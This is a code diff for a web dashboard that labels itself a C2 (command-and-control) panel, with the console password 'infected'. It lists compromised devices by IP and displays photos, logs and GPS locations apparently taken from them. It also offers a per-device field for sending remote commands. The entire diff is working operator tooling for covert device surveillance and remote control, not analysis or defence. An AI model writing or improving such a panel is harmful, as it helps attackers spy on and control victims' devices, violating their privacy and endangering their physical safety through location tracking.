+                        photoFull = '<span class="no-data">No photos</span>';
+                    } else {
+                        const first6 = allPhotos.slice(0, 6);
+                        photoLimited = first6.map(p => {
+                            let url = p.publicUrl || p.file_path || (p.data_url && p.data_url.startsWith('data:') ? p.data_url : '');
+                            return url ? `<img src="${url}" alt="photo" onclick="window.open('${url}')" loading="lazy" />` : '';
+                        }).join('');
+                        if (pc > 6) photoLimited += `<span style="color:#4a6a7a;font-size:11px;">+${pc-6} more</span>`;
+                        photoFull = allPhotos.map(p => {
+                            let url = p.publicUrl || p.file_path || (p.data_url && p.data_url.startsWith('data:') ? p.data_url : '');
+                            return url ? `<img src="${url}" alt="photo" onclick="window.open('${url}')" loading="lazy" />` : '';
+                        }).join('');
+                    }
+
+                    // Logs Limited/Full
+                    let logLimited = '', logFull = '';
+                    if (lc === 0) {
+                        logLimited = '<span style="color:#4a6a7a;">No logs</span>';
+                        logFull = '<span style="color:#4a6a7a;">No logs</span>';
+                    } else {
+                        const first6Logs = allLogs.slice(0, 6);
+                        logLimited = first6Logs.map(l =>
+                            `<div class="log-entry"><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span><span class="lvl-${l.level||'info'}">${l.message||''}</span></div>`
+                        ).join('');
+                        if (lc > 6) logLimited += `<div style="color:#4a6a7a;font-size:10px;">+${lc-6} more</div>`;
+                        logFull = allLogs.map(l =>
+                            `<div class="log-entry"><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span><span class="lvl-${l.level||'info'}">${l.message||''}</span></div>`
+                        ).join('');
+                    }
+
+                    // Locations Limited/Full
+                    let locLimited = '', locFull = '';
+                    if (locc === 0) {
+                        locLimited = '<span style="color:#4a6a7a;font-size:11px;">No locations</span>';
+                        locFull = '<span style="color:#4a6a7a;font-size:11px;">No locations</span>';
+                    } else {
+                        const first4Locs = allLocations.slice(0, 4);
+                        locLimited = first4Locs.map(l =>
+                            `<div class="loc-entry"><span class="coords">📍 ${l.lat}, ${l.lon}</span><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span></div>`
+                        ).join('');
+                        if (locc > 4) locLimited += `<span style="color:#4a6a7a;font-size:10px;">+${locc-4} more</span>`;
+                        locFull = allLocations.map(l =>
+                            `<div class="loc-entry"><span class="coords">📍 ${l.lat}, ${l.lon}</span><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span></div>`
+                        ).join('');
+                    }
+
+                    const repId = latest.id;
+                    const hasExtra = (pc > 6) || (lc > 6) || (locc > 4);
+
+                    const card = document.createElement('div');
+                    card.className = 'device-card';
+                    card.id = `card_${repId}`;
+                    card.innerHTML = `
+                        <div style="display:flex;justify-content:space-between;align-items:center;">
+                            <div class="device-ip">${ip}</div>
+                            <span class="status-indicator ${statusClass}"><span class="status-dot ${statusDot}"></span> ${statusLabel}</span>
+                        </div>
+                        <div class="device-meta">
+                            <div><span class="label">Platform:</span> ${latest.platform || 'Unknown'}</div>
+                            <div><span class="label">Screen:</span> ${latest.screen || 'Unknown'}</div>
+                            <div><span class="label">Devices:</span> ${deviceList.length} (IDs: ${deviceList.map(d=>d.id).join(', ')})</div>
+                            <div><span class="label">Last seen:</span> <span class="highlight">${new Date(latest.last_seen).toLocaleString()}</span></div>
+                            <div class="row" style="margin-top:6px;padding-top:6px;border-top:1px solid rgba(42,42,68,0.2);">
+                                <span><span class="label">📸 Photos:</span> ${pc}</span>
+                                <span><span class="label">📋 Logs:</span> ${lc}</span>
+                                <span><span class="label">📍 Locations:</span> ${locc}</span>
+                            </div>
+                        </div>
+
+                        <div class="notes-area">
+                            <input type="text" id="notes_input_${repId}" placeholder="Add note..." value="${latest.notes || ''}" />
+                            <button onclick="updateNotes('${repId}')">💾</button>
+                        </div>
+
+                        <div class="command-section">
+                            <input type="text" id="cmd_input_${repId}" placeholder="Enter command..." />
+                            <button class="btn btn-primary" onclick="sendCommand('${repId}')">📤 Send</button>
+                        </div>
+                        <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
+                            <button class="btn" onclick="showHistory('${repId}')">📜 History</button>
+                            <button class="btn" onclick="window.open('/api/photos?deviceId=${repId}')">📸 Photos</button>
+                            <button class="btn btn-danger" onclick="deleteDevice('${repId}')">🗑️ Remove</button>
+                            ${hasExtra ? `<button class="btn show-all-btn" id="toggle_btn_${repId}" onclick="toggleExtra('${repId}')">📂 Show All Data</button>` : ''}
+                        </div>
+
+                        <div class="section-title">📸 Photos <span class="count">${pc}</span></div>
+                        <div class="photo-grid" id="photo_limited_${repId}">${photoLimited}</div>
+                        <div class="photo-grid hidden-extra" id="photo_full_${repId}">${photoFull}</div>
+
+                        <div class="section-title">📋 Logs <span class="count">${lc}</span></div>
+                        <div class="log-area" id="log_limited_${repId}">${logLimited}</div>
+                        <div class="log-area hidden-extra" id="log_full_${repId}">${logFull}</div>
+
+                        <div class="section-title">📍 Locations <span class="count">${locc}</span></div>
+                        <div class="loc-list" id="loc_limited_${repId}">${locLimited}</div>
+                        <div class="loc-list hidden-extra" id="loc_full_${repId}">${locFull}</div>
+
+                        ${mapHtml}
+                    `;
+                    fragment.appendChild(card);
+
+                    // Lazy map init
+                    if (locc > 0) {
+                        const mapContainer = card.querySelector(`#map_${ip}`);
+                        if (mapContainer) {
+                            const observer = new IntersectionObserver((entries) => {
+                                entries.forEach(entry => {
+                                    if (entry.isIntersecting && !mapContainer._leaflet) {
+                                        const lastLoc = allLocations[0];
+                                        const map = L.map(mapContainer).setView([lastLoc.lat, lastLoc.lon], 13);
+                                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
+                                        L.marker([lastLoc.lat, lastLoc.lon]).addTo(map).bindPopup(`IP: ${ip}<br>Last: ${new Date(lastLoc.timestamp).toLocaleString()}`);
+                                        mapContainer._leaflet = map;
+                                        observer.disconnect();
+                                    }
+                                });
+                            }, { threshold: 0.1 });
+                            observer.observe(mapContainer);
+                        }
+                    }
+                }
+
+                // 6. Replace grid content with new fragment (no flash)
+                deviceGrid.innerHTML = '';
+                deviceGrid.appendChild(fragment);
+
+                // 7. Update stats and timestamp
+                statPhotos.textContent = totalPhotos;
+                statLogs.textContent = totalLogs;
+                statLocations.textContent = totalLocations;
+                updateLastUpdated();
+
+            } catch (err) {
+                console.error(err);
+                // Show error but don't clear existing cards if any
+                if (!deviceGrid.children.length) {
+                    deviceGrid.innerHTML = `<div class="error-box">❌ Error loading devices: ${err.message}</div>`;
+                } else {
+                    // Append error message at the top
+                    const errorDiv = document.createElement('div');
+                    errorDiv.className = 'error-box';
+                    errorDiv.style.gridColumn = '1 / -1';
+                    errorDiv.textContent = `⚠️ Error refreshing data: ${err.message}`;
+                    deviceGrid.prepend(errorDiv);
+                    setTimeout(() => errorDiv.remove(), 8000);
                 }
             }
-
-            statPhotos.textContent = totalPhotos;
-            statLogs.textContent = totalLogs;
-            statLocations.textContent = totalLocations;
 
             isLoading = false;
-            refreshBtn.textContent = '🔄 Refresh';
             refreshBtn.disabled = false;
+            refreshBtn.innerHTML = '<span class="icon">🔄</span> Refresh';
         }
 
         // ============================================================
@@ -749,12 +811,20 @@
         // ============================================================
         //  BOOT
         // ============================================================
-        refreshBtn.addEventListener('click', loadDevices);
-        checkAuth();
-        if (!dashboardContainer.classList.contains('active')) passwordInput.focus();
+        async function boot() {
+            await loadConfigFile();
+            refreshBtn.addEventListener('click', loadDevices);
+            checkAuth();
+            if (!dashboardContainer.classList.contains('active')) passwordInput.focus();
 
-        console.log('☠️ Optimised C2 Dashboard with "Show All" per card');
-        console.log('🔐 Password: infected');
+            console.log('☠️ C2 Dashboard loaded (no flash)');
+            console.log('🔐 Password: infected');
+            console.log(`🔗 Using Backend: ${getBackend()}`);
+            console.log(`🔗 Using Relay: ${getRelay()}`);
+            console.log(`📄 Config source: ${configLoaded ? 'config.json' : (localStorage.getItem('backend_url') ? 'localStorage' : 'defaults')}`);
+        }
+
+        boot();
     </script>
 </body>
 </html>
